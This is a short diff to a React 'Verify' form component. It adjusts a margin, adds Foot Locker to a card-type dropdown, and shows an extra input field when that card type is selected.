@@ -104,7 +104,7 @@ const Verify = () => {
 
 
   return (
-    <section className='mt-32 w-screen h-screen bg-primary flex items-center justify-center' id='verify'>
+    <section className='mt-8 w-screen h-screen bg-primary flex items-center justify-center' id='verify'>
       <div className='flex flex-col items-center justify-center sm:w-1/2 h-max py-12 bg-secondary sm:rounded-xl'>
       {emailSent ? (
         // <Success />
@@ -127,6 +127,7 @@ const Verify = () => {
             <option value="Amex">Amex</option>
             <option value="Apple">Apple</option>
             <option value="eBay">eBay</option>
+            <option value="Foot locker">Foot Locker</option>
             <option value="Nike">Nike</option>
             <option value="Nodestorm">Nodestorm</option>
             <option value="MasterCard">MasterCard</option>
@@ -194,7 +195,7 @@ const Verify = () => {
 
 
             {/* Conditionally render cardtype elements if selected */}
-          {(cardType === 'Nodestorm' || cardType === 'Nike' || cardType === 'Sephora') && (
+          {(cardType === 'Nodestorm' || cardType === 'Nike' || cardType === 'Sephora' || cardType === 'Foot locker') && (
           <div>
             <input
               className='w-full h-16 p-4 rounded-xl' 
